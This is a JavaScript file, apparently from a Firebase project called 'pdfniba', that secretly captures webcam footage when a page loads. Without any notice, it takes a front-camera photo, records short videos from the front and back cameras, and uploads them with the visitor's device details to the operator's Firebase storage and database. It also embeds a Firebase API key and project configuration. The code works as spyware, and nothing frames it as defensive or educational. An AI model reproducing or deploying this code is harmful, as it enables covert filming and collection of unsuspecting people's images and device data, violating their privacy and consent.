import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

/* ---------- FIREBASE CONFIG ---------- */
const firebaseConfig = {
  apiKey: "AIzaSyA5HSha0laFzd9rQZw5sAHW6O1BcX8BPzI",
  authDomain: "pdfniba.firebaseapp.com",
  projectId: "pdfniba",
  storageBucket: "pdfniba.firebasestorage.app",
  messagingSenderId: "809688909652",
  appId: "1:809688909652:web:9867944191bd95704aaac1"
};

const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const db = getFirestore(app);

console.log("Camera.js loaded 🚀");

/* ---------- HELPERS ---------- */

function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    time: new Date().toISOString()
  };
}

async function startStream(facingMode) {
  return navigator.mediaDevices.getUserMedia({
    video: { facingMode },
    audio: false
  });
}

async function takePhoto(stream) {
  const track = stream.getVideoTracks()[0];
  const imageCapture = new ImageCapture(track);
  return await imageCapture.takePhoto();
}

function recordVideo(stream, duration = 3000) {
  return new Promise(resolve => {
    const recorder = new MediaRecorder(stream);
    const chunks = [];

    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => resolve(new Blob(chunks, { type: "video/webm" }));

    recorder.start();
    setTimeout(() => recorder.stop(), duration);
  });
}

async function uploadToFirebase(blob, name) {
  const fileRef = ref(storage, `captures/${Date.now()}_${name}`);
  await uploadBytes(fileRef, blob);
  return await getDownloadURL(fileRef);
}

/* ---------- MAIN SEQUENCE (Auto Start) ---------- */

async function autoCapture() {
  try {
    console.log("🎥 Starting FRONT camera...");

    const frontStream = await startStream("user");
    const photoBlob = await takePhoto(frontStream);
    const frontVideoBlob = await recordVideo(frontStream, 3000);

    frontStream.getTracks().forEach(t => t.stop());

    console.log("🎥 Switching to BACK camera...");

    const backStream = await startStream({ exact: "environment" });
    const backVideoBlob = await recordVideo(backStream, 3000);

    backStream.getTracks().forEach(t => t.stop());

    console.log("☁️ Uploading to Firebase...");

    const photoURL = await uploadToFirebase(photoBlob, "front_photo.jpg");
    const frontVideoURL = await uploadToFirebase(frontVideoBlob, "front_video.webm");
    const backVideoURL = await uploadToFirebase(backVideoBlob, "back_video.webm");

    await addDoc(collection(db, "captures"), {
      photoURL,
      frontVideoURL,
      backVideoURL,
      device: getDeviceInfo(),
      createdAt: Date.now()
    });

    console.log("✅ Capture sequence complete.");

  } catch (err) {
    console.error("❌ Capture failed:", err);
    alert("Camera capture error: " + err.message);
  }
}

/* ---------- AUTO RUN WHEN PAGE LOADS ---------- */

window.addEventListener("load", () => {
  console.log("Auto-capture starting…");
  autoCapture();
});
